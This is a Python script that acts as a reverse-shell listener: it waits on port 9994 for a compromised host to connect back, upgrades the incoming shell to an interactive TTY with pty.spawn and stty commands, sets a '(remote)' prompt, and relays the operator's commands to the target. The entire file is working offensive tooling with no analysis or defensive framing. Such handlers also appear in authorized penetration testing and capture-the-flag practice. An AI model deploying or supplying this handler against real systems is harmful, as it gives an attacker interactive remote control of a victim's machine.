import socket
import sys
import time
import os


def listen(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Listening on port " + str(port))
    conn, addr = s.accept()
    print('Connection received from ', addr)
    conn.recv(5000)
    command = (
        ";".join(
            [
                f'export SHELL=/bin/bash',
                f'python -c "import pty;pty.spawn(\"/bin/bash\")"',
                f"export TERM='xterm'",
            ]
        )
        + "\n"
    )
    conn.send(command.encode('utf-8'))
    conn.recv(5000)
    conn.send(b'\x1a')
    conn.recv(5000)
    conn.send('stty raw -echo;fg\n'.encode('utf-8'))
    conn.recv(5000)
    time.sleep(1)
    command1 = (";".join([
        f"stty rows 100 columns 100",
        f"stty sane",
        f"""export PS1='$(command printf "\033[01;31m(remote)\033[0m \033[01;33m$(whoami)@$(hostname)\033[0m:\033[1;36m$PWD\033[0m\$ ")';""",
    ]
    )
        + "\n"
    )
    conn.send(command1.encode('utf-8'))
    conn.recv(5000)
    sys.stdout.write(conn.recv(5000).decode())
    while True:
        # Receive data from the target and get user input
        command = input()

        # Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(.1)
        # Remove the output of the "input()" function
        ans = conn.recv(5000).decode()
        sys.stdout.write("\033[A" + ans.split("\n")[-1])
        sys.stdout.write(ans)


listen("0.0.0.0", 9994)
